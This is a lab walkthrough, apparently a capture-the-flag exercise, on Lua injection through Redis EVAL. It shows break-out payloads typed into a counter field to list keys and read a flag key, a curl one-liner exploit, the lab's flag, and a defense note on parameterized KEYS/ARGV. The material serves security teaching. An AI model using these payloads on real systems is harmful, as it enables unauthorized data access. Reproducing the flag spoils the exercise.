<h4>Step 1: Test Normal Counter Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>visits<br>
        <span class="prompt">EVAL: </span>local val = redis.call('GET', 'lab2:counter:visits'); return val<br>
        <span class="prompt">Result: </span>4821
    </div>
</div>

<h4>Step 2: Inject Lua to Enumerate Keys</h4>
<p>
    The counter name is concatenated directly into a Lua script. Close the GET call
    with <code>')</code> and inject new Lua code. Use <code>--</code> to comment out
    the remainder of the original script.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Key Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'); local k = redis.call('KEYS', 'lab2:*'); return k --<br><br>
        <span class="prompt">Result: </span>["lab2:counter:logins", "lab2:rate_limit:api", "lab2:counter:visits",
        "<strong>lab2:flag_store</strong>", "lab2:config:lua_enabled", "lab2:analytics:daily"]
    </div>
</div>

<h4>Step 3: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'); local s = redis.call('GET', 'lab2:flag_store'); return s --<br><br>
        <span class="prompt">Result: </span><strong>FLAG{rd_lu4_3v4l_1nj3ct}</strong>
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{rd_lu4_3v4l_1nj3ct}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/redis/lab2" \<br> --data-urlencode "counter='); local s = redis.call('GET', 'lab2:flag_store'); return s --"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Redis <code>EVAL</code> executes Lua scripts server-side.
    If user input is concatenated into a Lua script string, attackers can break out and
    execute arbitrary Redis commands via <code>redis.call()</code>. Lua in Redis can:
    execute any Redis command, perform conditional logic, iterate over keys, and even
    call <code>redis.call('CONFIG', 'SET', ...)</code>. Defense: use parameterized
    <code>KEYS</code> arguments (passed as KEYS/ARGV arrays) instead of string concatenation.
</div>
